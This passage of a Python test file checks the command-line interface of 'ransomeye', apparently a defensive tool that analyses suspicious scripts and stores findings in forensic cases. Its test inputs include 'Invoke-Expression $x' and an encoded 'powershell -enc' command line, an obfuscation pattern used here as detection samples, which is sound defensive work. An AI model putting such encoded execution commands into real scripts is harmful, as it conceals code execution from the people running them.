        {"finding_id": "F-behaviour", "event_ids": ["EVT-PROC-9"], "case_id": "CASE-SCRIPT-1"},
        {"finding_id": "F-script", "event_ids": ["EVT-PROC-9"], "case_id": "CASE-SCRIPT-1"},
    ]
    incidents = correlate_findings(findings, evidence=[event])
    assert len(incidents) == 1
    assert "shared_evidence" in incidents[0].correlation_reasons


# --------------------------------------------------------------------------- #
# Stage 3: CLI (ransomeye script)
# --------------------------------------------------------------------------- #

import json as _json  # noqa: E402

from ransomeye.commands import run_script_analysis_command, main as cli_main  # noqa: E402


def test_cli_text_summary_output(capsys):
    assert run_script_analysis_command(text="Invoke-Expression $x") == 0
    out = capsys.readouterr().out
    assert "SCRIPT ANALYSIS REPORT" in out


def test_cli_text_json_output(capsys):
    assert run_script_analysis_command(text="Invoke-Expression $x", as_json=True) == 0
    data = _json.loads(capsys.readouterr().out)
    assert "sha256" in data and data["analysis_status"] == sa.STATUS_COMPLETE


def test_cli_file_analysis_only(tmp_path, capsys):
    target = _write_script(tmp_path)
    assert run_script_analysis_command(file_path=target) == 0
    assert "SCRIPT ANALYSIS REPORT" in capsys.readouterr().out


def test_cli_file_persists_into_case(tmp_path, capsys):
    db = tmp_path / "cli.db"
    store = EvidenceStore(db)
    store.create_case("C-CLI", "cli")
    store.close()

    target = _write_script(tmp_path)
    assert run_script_analysis_command(file_path=target, database_path=db, case_id="C-CLI") == 0
    assert "ingested into case C-CLI" in capsys.readouterr().out

    store = EvidenceStore(db)
    try:
        assert len(store.get_case_findings("C-CLI")) > 0
        assert len(store.get_case_events("C-CLI")) == 1
    finally:
        store.close()


def test_cli_text_cannot_persist(tmp_path):
    db = tmp_path / "cli.db"
    store = EvidenceStore(db)
    store.create_case("C", "c")
    store.close()
    with pytest.raises(ValueError, match="cannot be added to a case"):
        run_script_analysis_command(text="Invoke-Expression $x", database_path=db, case_id="C")


def test_cli_event_mode(tmp_path, capsys):
    db = tmp_path / "cli.db"
    store = EvidenceStore(db)
    store.create_case("C-EVT", "evt")
    enc = _b64_utf16le("Invoke-Expression $x")
    store.save_event("C-EVT", {
        "event_id": "EVT-1",
        "timestamp": "2026-01-01T00:00:00+00:00",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": f"powershell -enc {enc}",
    })
    store.close()

    assert run_script_analysis_command(event_id="EVT-1", database_path=db, case_id="C-EVT") == 0

    store = EvidenceStore(db)
    try:
        assert len(store.get_case_events("C-EVT")) == 1  # no new event
        findings = store.get_case_findings("C-EVT")
        assert findings and all(f["event_ids"] == ["EVT-1"] for f in findings)
        assert store.get_custody_events("C-EVT") == []  # command-line mode: no custody
    finally:
        store.close()


def test_cli_event_requires_database_and_case():
    with pytest.raises(ValueError, match="requires --database and --case"):
        run_script_analysis_command(event_id="EVT-1")


def test_cli_event_unknown_rejected(tmp_path):
    db = tmp_path / "cli.db"
    store = EvidenceStore(db)
    store.create_case("C", "c")
    store.close()
    with pytest.raises(KeyError):
        run_script_analysis_command(event_id="NOPE", database_path=db, case_id="C")


def test_cli_event_without_command_line_rejected(tmp_path):
    db = tmp_path / "cli.db"
    store = EvidenceStore(db)
    store.create_case("C", "c")
    store.save_event("C", {
        "event_id": "EVT-NO-CMD",
        "timestamp": "2026-01-01T00:00:00+00:00",
        "source": "sysmon",
        "event_type": "file_create",
        "file_path": "x.txt",
    })
    store.close()
    with pytest.raises(ValueError, match="no command line"):
        run_script_analysis_command(event_id="EVT-NO-CMD", database_path=db, case_id="C")


def test_cli_requires_exactly_one_input():
    with pytest.raises(ValueError, match="exactly one"):
        run_script_analysis_command()


def test_cli_export_writes_report(tmp_path):
    out = tmp_path / "report.txt"
    run_script_analysis_command(text="Invoke-Expression $x", export_path=out)
    assert out.is_file()
    assert "SCRIPT ANALYSIS REPORT" in out.read_text(encoding="utf-8")


def test_cli_export_json_by_suffix(tmp_path):
    out = tmp_path / "report.json"
    run_script_analysis_command(text="Invoke-Expression $x", export_path=out)
    data = _json.loads(out.read_text(encoding="utf-8"))
    assert "sha256" in data


def test_cli_export_refuses_overwrite(tmp_path):
    out = tmp_path / "exists.txt"
    out.write_text("keep me", encoding="utf-8")
    with pytest.raises(FileExistsError, match="already exists"):
        run_script_analysis_command(text="Invoke-Expression $x", export_path=out)
    assert out.read_text(encoding="utf-8") == "keep me"


def test_cli_language_forced(capsys):
    run_script_analysis_command(text="Invoke-Expression $x", language="vbscript", as_json=True)
    assert _json.loads(capsys.readouterr().out)["language"] == "vbscript"


def test_cli_invalid_language_rejected():
    with pytest.raises(ScriptAnalysisError):
        run_script_analysis_command(text="x", language="perl")


def test_cli_missing_file_raises(tmp_path):
    with pytest.raises(FileNotFoundError):
        run_script_analysis_command(file_path=tmp_path / "nope.ps1")


# --- argparse wiring via main() ---

def test_main_script_text(monkeypatch, capsys):
    monkeypatch.setattr("sys.argv", ["ransomeye", "script", "--text", "Invoke-Expression $x"])
    cli_main()
    assert "SCRIPT ANALYSIS REPORT" in capsys.readouterr().out


def test_main_script_mutually_exclusive_inputs(monkeypatch):
    monkeypatch.setattr("sys.argv", ["ransomeye", "script", "--file", "a.ps1", "--text", "x"])
    with pytest.raises(SystemExit) as exc:
        cli_main()
    assert exc.value.code == 2  # argparse usage error


def test_main_script_missing_file_exit_1(monkeypatch, tmp_path):
    monkeypatch.setattr("sys.argv", ["ransomeye", "script", "--file", str(tmp_path / "nope.ps1")])
    with pytest.raises(SystemExit) as exc:
        cli_main()
    assert exc.value.code == 1


def test_main_script_persist_and_export(monkeypatch, tmp_path, capsys):
    db = tmp_path / "m.db"
    store = EvidenceStore(db)
    store.create_case("C-MAIN", "main")
    store.close()
    target = _write_script(tmp_path)
    export = tmp_path / "out.json"
    monkeypatch.setattr("sys.argv", [
        "ransomeye", "script", "--file", str(target),
        "--database", str(db), "--case", "C-MAIN", "--json", "--export", str(export),
    ])
    cli_main()
    assert export.is_file()
    store = EvidenceStore(db)
    try:
        assert len(store.get_case_findings("C-MAIN")) > 0
    finally:
        store.close()
